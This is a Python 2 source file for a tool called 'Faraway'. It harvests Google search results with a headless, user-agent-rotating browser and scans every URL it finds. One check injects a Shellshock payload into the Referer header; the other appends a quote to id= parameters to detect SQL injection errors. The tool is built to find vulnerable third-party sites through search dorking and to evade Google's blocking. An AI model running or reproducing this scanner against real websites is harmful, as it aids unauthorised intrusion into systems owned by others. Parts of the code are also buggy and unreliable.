#!/usr/bin/python
import os, sys, time, urlparse, re, time, random, urllib2, logging, socket, httplib
try:
	from termcolor import cprint
	from selenium.webdriver.remote.remote_connection import LOGGER
	from selenium import webdriver
	from selenium.webdriver.common.keys import Keys
	from selenium.webdriver.common.by import By
	from selenium.webdriver.support import expected_conditions as EC
	from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
	from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
	from tbselenium.tbdriver import TorBrowserDriver
	from os.path import dirname, join, realpath, getsize
except:
	uid = os.getuid()
	if uid == 0:
		print "Attempting to Install Requeriments....\nIf you already have the requeriments, quit then run without root"
		time.sleep(7)
		os.system("pip install termcolor"); os.system("pip install selenium"); os.system("apt-get install ipython"); os.system("pip3 install selenium"); os.system("wget https://github.com/mozilla/geckodriver/releases/download/v0.21.0/geckodriver-v0.21.0-linux64.tar.gz"); os.system("tar xf *.tar.gz"); os.system("mv geckodriver /usr/local/bin/") 
		os.system("pip install tbselenium"); os.system("wget https://www.torproject.org/dist/torbrowser/7.5.6/tor-browser-linux64-7.5.6_en-US.tar.xz -O /usr/share/tor-browser.tar.xz"); os.system("cd /usr/share/ && tar -xf tor-browser.tar.xz && rm -rf /usr/share/tor-browser.tar.xz"); os.system("apt-get install xvfb")
		username = raw_input("Enter your Username [ WITHOUT ROOT ]: "); os.system("setfacl -m u:"+username+":rwx /usr/share/tor-browser_en-US/*/"); os.system("setfacl -m u:"+username+":rwx /usr/share/tor-browser_en-US/*/*"); os.system("setfacl -m u:"+username+":rwx /usr/share/tor-browser_en-US/*/*/*"); os.system("setfacl -m u:"+username+":rwx /usr/share/tor-browser_en-US/*/*/*/*")
		os.system("chown -R "+username+" /usr/share/tor-browser_en-US/")
		print "\n\nRequeriments have been installed\nRun Again WITHOUT root"
	else:
		sys.exit("[!] Run as Root to Install the Requeriments\nExiting...")

logo = """
							    Coded by: Fex0rDev
 .o88o.                                                                     
 888 `"                                                                     
o888oo   .oooo.   oooo d8b  .oooo.   oooo oooo    ooo  .oooo.   oooo    ooo 
 888    `P  )88b  `888""8P `P  )88b   `88. `88.  .8'  `P  )88b   `88.  .8'  
 888     .oP"888   888      .oP"888    `88..]88..8'    .oP"888    `88..8'   
 888    d8(  888   888     d8(  888     `888'`888'    d8(  888     `888'    
o888o   `Y888""8o d888b    `Y888""8o     `8'  `8'     `Y888""8o     .8'     
                                                                .o..P'      
                                                                `Y8P'       
                                                                         
			Google Search Tool & SQL Injection + Shellshock Scanner                                                          
"""

def help():
	print logo
	print "Usage:\n"+sys.argv[0]+" <search term> <pages>\n\nOptional Argumments:\n--shellshock, Checks for Bash Shellshock Vulnerability\n--sqli, Checks for SQL Injection in URLS\n--debug, Show Browser Window's for Debug Purposes\n--output, Save Output into a file\n--user-agent, Random Select an User-Agent to use\n--dorks, Print Known Dorks then quit program\n--help, Show Help Menu"
	sys.exit(0)

#arg checker
if len(sys.argv) < 3:
	help()

#declarations
term = sys.argv[1]
indexnum = sys.argv[2]

def getuseragent():
	useragentlist = [
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.52",
		"Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
		"Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 ASW/1.51.2220.53",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36 ASW/1.46.1990.139",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.9600",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
		"Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36 Edge/12.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
	]
	ua = random.choice(useragentlist)
	return ua

def search():
	try:
		global indexnum
		global shellshockscan
		index = 0
		pagenum = 0
		urls = driver.find_elements_by_css_selector("h3.r a")
		l = []

		for u in urls:
			l.append(u.get_attribute('href'))

		if len(l) < 1:
			if not "--debug" in sys.argv:
				cprint("[!] Search Term is Invalid OR You have been blocked by Google", color="red", attrs=["bold"]); answered = False
				while answered == False:
					unlock = raw_input("\x1b[1;31m[*] Unlock Submitting Captcha or Using TOR? [[C]aptcha/n/q/[T]or]: \x1b[0m")
					if str(unlock).startswith("c") or str(unlock).startswith("C"):
						try:
							cprint("[*] Opening Captcha Page...", color="green", attrs=["bold"]); answered = True
							time.sleep(1)
							browsershow = webdriver.Firefox()
							browsershow.get("http://google.com/#q="+term)
						except:
							cprint("[*] Exiting...", color="red", attrs=["bold"]); driver.quit(); sys.exit(0)												#DRIVER QUIT

					elif str(unlock).startswith("t") or str(unlock).startswith("T"):
						try:
							sys.exit("[!] This function is temporarily disabled")
						except Exception as e:
							print str(e)
							#if str(e).startswith("")



					elif str(unlock).startswith("n") or str(unlock).startswith("N"):
						pass; answered = True
					elif str(unlock).startswith("q") or str(unlock).startswith("Q"):
						cprint("[*] Exiting...", color="red", attrs=["bold"]); sys.exit(0)
					else:
						cprint("[Error] Invalid Choice", color="red", attrs=["bold"]); answered = False

			if "--debug" in sys.argv:
				cprint("[!] Search Term is Invalid OR You have been blocked by Google", color="red", attrs=["bold"])

		cprint("[*] URL Crawller:", color="yellow", attrs=["bold"])
		for u in urls:
			print "\x1b[93m"+u.get_attribute('href')
	except KeyboardInterrupt:
		driver.quit(); sys.exit(1)


	while index < indexnum:
		try:
			index = int(index) + 1
			indexnum = int(indexnum)
		except:
			print "-Invalid Number of pages\n-Exiting..."; sys.exit(0)
		try:
			pagenum += 10
			pagenum = str(pagenum)
			time.sleep(3) #7
		except KeyboardInterrupt:
			driver.quit(); os.system("pkill geckodriver"); sys.exit(1)
		try:
			next = driver.get("http://google.com/#q="+term+"&start="+pagenum)
			pagenum = int(pagenum)
			urls = driver.find_elements_by_css_selector("h3.r a")
		except httplib.BadStatusLine:
			pass; pagenum = int(pagenum)
		except KeyboardInterrupt:
			driver.quit(); sys.exit(1)												#DRIVER QUIT
		for u in urls:
			l.append(u.get_attribute('href'))
			print u.get_attribute('href')

		#SHELLSHOCK CVE-2014-6271 SCANNER
	if shellshockscan == True:
		nr = 0
		nrmax = str(len(l))
		print "\n-Scanning for Shellshock Vulnerability..."
		urlshellshock = []
		exploit = "() { :;}; /bin/echo 'reflections'"
		for u in l:
			rq = urllib2.Request(u)
			rq.add_header("User-Agent", getuseragent())
			rq.add_header("Referer", exploit)
			try:
				r = urllib2.urlopen(rq, timeout=15)
				nr += 1
				nr = str(nr)
				print "\r"+nr+"/"+nrmax+"",
				nr = int(nr)
				response = r.info()
				if 'reflections' in r.info():
					print "-SHELLSHOCK VULNERABLE:\n[ %s ]\n"%(u)
					urlshellshock.append(u)
			except urllib2.HTTPError:
				pass
			except socket.timeout:
				pass
			except urllib2.URLError:
				pass
			except socket.error:
				pass
			except KeyboardInterrupt:
				driver.quit(); sys.exit(1)											#QUIT DRIVER
	elif sqliscan == True:
		sqli(l)


		#Results Clear Form
	cprint("\nGenerating Report....", color="green", attrs=["bold"]); time.sleep(0.7)
	driver.quit()																	#QUIT DRIVER
	os.system("clear"); os.system("clear")

	#Checking file name to save AND if is there --output argument
	if "--output" in sys.argv:
			for i in xrange(0, len(sys.argv)):
				isthat = sys.argv[i]
				if isthat == "--output":
					p = i + 1
					outputfile = sys.argv[p]
					outputcheck = True

	if not "--output" in sys.argv:
		outputcheck = False

	
	#RESULTS																			
	if len(l) <= 0:
		cprint("[*] URL Crawler Results [%d]:", color="yellow", attrs=["bold"])
		cprint("[!] No Results Found"%(len(l)), color="red", attrs=["bold"])
	if len(l) >= 1:
		cprint("[*] URL Crawler Results [%d]:"%(len(l)), color="yellow", attrs=["bold"])
		for url in l:
			#print "- "+url+" "*(77 - len(url))+"|"
			print"\x1b[93m- "+url
		
		if shellshockscan == True:
			if len(urlshellshock) <= 0:
				print "\n- Shellshock Vulnerability Report's:"
				print "- No Vulnerable URL Found"
			if len(urlshellshock) < 0:
				print "\n- Shellshock Vulnerability Report's [%d]:"%(len(urlshellshock))
				for url in urlshellshock:
					print "- "+url

		if sqliscan == True:
			if len(sqlvuln) <= 0:
				cprint("\n[!] SQL Injection Vulnerability Report's:", color="yellow", attrs=["bold"])
				cprint("[*] No Vulnerable URL Found", color="red", attrs=["bold"])
			else:
				cprint("\n[!] SQL Injection Vulnerability Report's:", color="yellow", attrs=["bold"])
				for url in sqlvuln:
					print "\x1b[0;93m- "+url+" "*(71 - len(url+"'"))+"\x1b[0m| \x1b[1;31mSQLI \x1b[0m|"

		
		#Saving output if --output is activated
	if outputcheck == True:
		with open(outputfile, "w") as outputf:
			for url in l:
				outputf.write(url+"\n")

	os.system("pkill geckodriver"); sys.exit(1)

def sqli(l):
	cprint("\n[*] Scanning SQL Injection...", color="yellow", attrs=["bold"])
	urlid = []
	global sqlvuln
	sqlvuln = []
	probalyvuln = []
	for url in l:
		if "id=" in url:
			urlid.append(url)

	for url in urlid:
		try:
			if "&" in url:
				cleanurl = str(url)
				url = str(url).split("&")

				for i in xrange(0, len(url)):
					if "id=" in url[i]:
						urlwithid = url[i]
						break;

				if i == 0:
					url = str(urlwithid)
				if i != 0:
					url =  str(cleanurl).split("?")[0]+"?"+str(urlwithid)

			req = urllib2.Request(url+"'")
			req.add_header("User-Agent", getuseragent())
			req.add_header("Referer", "https://google.com")
			res = urllib2.urlopen(req)
			response = res.read()

			if "error in your SQL" in response:
				print "\x1b[0;93m"+url+" "*(73 - len(url+"'"))+"\x1b[0m| \x1b[1;31mSQLI \x1b[0m|"
				sqlvuln.append(url)
			#do an 'it might be a false positive'
		except urllib2.HTTPError:
			pass
		except urllib2.HTTPError:
			pass
		except socket.timeout:
			pass
		except urllib2.URLError:
			pass
		except socket.error:
			pass

#Error Handler
if __name__ == "__main__":

		#EXTENDED SCANS:
		shellshockscan = False
		sqliscan = False

		if not "--debug" in sys.argv:
			LOGGER.setLevel(logging.WARNING)
			options = webdriver.FirefoxOptions()
			options.set_headless(True)
			if "--user-agent" in sys.argv:
				try:
					profile = webdriver.FirefoxProfile(); profile.set_preference("general.useragent.override", getuseragent())
					driver = webdriver.Firefox(options=options, log_path=os.devnull, firefox_profile=profile)
					print "\x1b[1;92m-Attempting to Start the Crawller...\n-User-Agent:", driver.execute_script("return navigator.userAgent")
					if "--shellshock" in sys.argv:
						cprint("-Shellshock Scanner Activated", color="red", attrs=["bold"])
						shellshockscan = True
					if "--sqli" in sys.argv:
						cprint("-SQL Injection Scanner Activated", color="red", attrs=["bold"])
						sqliscan = True
					print ""
				except KeyboardInterrupt:
					os.system("pkill geckodriver"); cprint("\n- Exiting...", color="red", attrs=["bold"]); sys.exit(1)

			if not "--user-agent" in sys.argv:
				try:
					driver = webdriver.Firefox(options=options, log_path=os.devnull)
					print "\x1b[1;92m-Attempting to Start the Crawller..."
					if "--shellshock" in sys.argv:
						cprint("-Shellshock Scanner Activated", color="red", attrs=["bold"])
						shellshockscan = True
					if "--sqli" in sys.argv:
						cprint("-SQL Injection Scanner Activated", color="red", attrs=["bold"])
						sqliscan = True
					print ""
				except KeyboardInterrupt:
					os.system("pkill geckodriver"); cprint("\n-Exiting...", color="red", attrs=["bold"]); sys.exit(1)

			try:
				driver.get("http://google.com/#q="+term)
				search()
				driver.quit()
			except KeyboardInterrupt:
				os.system("pkill geckodriver"); cprint("\n-Exiting...", color="red", attrs=["bold"]); sys.exit(1)

		if "--debug" in sys.argv:
			debugflag = True
			if "--user-agent" in sys.argv:
				try:
					profile = webdriver.FirefoxProfile(); profile.set_preference("general.useragent.override", getuseragent())
					driver = webdriver.Firefox(firefox_profile=profile)
					print "\x1b[1;92m-Attempting to Start the Crawller...\n-User-Agent:", driver.execute_script("return navigator.userAgent")
					if "--shellshock" in sys.argv:
						cprint("-Using Shellshock Scanner", color="red", attrs=["bold"])
						shellshockscan = True
					if "--sqli" in sys.argv:
						cprint("-Using SQL Injection Scanner", color="red", attrs=["bold"])
						sqliscan = True
					print ""
				except KeyboardInterrupt:
					os.system("pkill geckodriver"); cprint("\n-Exiting...", color="red", attrs=["bold"]); sys.exit(1)

			if not "--user-agent" in sys.argv:
				try:
					driver = webdriver.Firefox()
					print "\x1b[1;92m-Attempting to Start the Crawller..."
					if "--shellshock" in sys.argv:
						cprint("-Shellshock Scanner Activated", color="red", attrs=["bold"])
						shellshockscan = True
					if "--sqli" in sys.argv:
						cprint("-SQL Injection Scanner Activated", color="red", attrs=["bold"])
						sqliscan = True
					print ""
				except KeyboardInterrupt:
					os.system("pkill geckodriver"); cprint("\n-Exiting...", color="red", attrs=["bold"]); sys.exit(1)

			driver.get("http://google.com/#q="+term)
			search()
			driver.quit()

		if "--help" in sys.argv:
			help(); sys.exit(1)
